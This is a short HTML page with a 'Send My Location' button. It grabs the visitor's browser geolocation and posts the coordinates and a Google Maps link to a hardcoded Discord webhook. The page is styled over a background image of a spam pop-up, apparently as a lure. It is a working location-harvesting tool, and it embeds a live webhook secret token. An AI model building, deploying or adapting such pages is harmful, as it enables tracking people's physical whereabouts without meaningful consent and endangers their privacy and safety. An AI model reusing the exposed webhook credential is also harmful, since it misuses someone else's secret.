<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location</title>
    <style>
        body {
            background: url('https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-wordpress-pages-1180x812.png') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        button {
            font-size: 20px;
            padding: 15px 30px;
            background-color: red;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: darkred;
        }
    </style>
</head>
<body>
    <button onclick="sendLocation()">Send My Location</button>

    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const webhookURL = "https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX";
                        
                        // Create message
                        const data = {
                            content: `üìç **New Location Shared!**\nüåç Latitude: ${latitude}\nüåè Longitude: ${longitude}\n[üìå View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`
                        };

                        // Send request to Discord webhook
                        fetch(webhookURL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(data)
                        })
                        .then(() => alert("üì° Location sent successfully!"))
                        .catch(() => alert("‚ùå Failed to send location."));
                    },
                    () => alert("‚ùå Location permission denied.")
                );
            } else {
                alert("‚ùå Geolocation is not supported by this browser.");
            }
        }
    </script>
</body>
</html>
